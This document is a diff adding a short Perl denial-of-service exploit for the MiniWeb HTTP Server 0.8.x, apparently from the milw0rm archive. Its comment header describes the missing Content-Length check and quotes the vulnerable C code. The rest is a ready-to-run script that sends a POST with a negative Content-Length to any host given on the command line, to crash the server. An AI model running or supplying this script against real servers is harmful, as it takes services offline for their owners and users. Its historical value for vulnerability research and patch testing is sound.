@@ -1,0 +1,39 @@
+# MiniWeb Http Server 0.8.x Remote Denial of Service
+# MiniWeb site http://sourceforge.net/projects/miniweb/
+# Author: gbr
+#
+# Tested running the server under Windows XP SP2
+#
+# Description:
+#
+# The server doesn't do a sanity-check on 'Content-Length' value from POST Header, allowing the attacker to control
+# the allocation size and the position in the 'pucPayload' char pointer to write.
+# This could be used to trigger an exception.
+#
+#
+# Vulnerable code - file http.c | lines 701-702 MiniWeb 0.8.1 | lines 704 - 705 MiniWeb 0.8.19
+# ------------------------------------------
+# phsSocket->request.pucPayload=malloc(phsSocket->response.iContentLength+1);
+# phsSocket->request.pucPayload[phsSocket->response.iContentLength]=0;
+# ------------------------------------------
+
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use IO::Socket;
+
+my $host = shift || die "usage: perl $0 host [port]\n";
+my $port = shift || 80;
+
+my $sock = new IO::Socket::INET(PeerAddr => $host, PeerPort => $port, PeerProto => 'tcp')
+or die "error: $!\n";
+
+$sock->send("POST / HTTP/1.1\r\n");
+$sock->send("Content-Length: -10\r\n\r\n");
+
+$sock->close;
+
+print "Exploited\n";
+
+# milw0rm.com [2007-06-07]
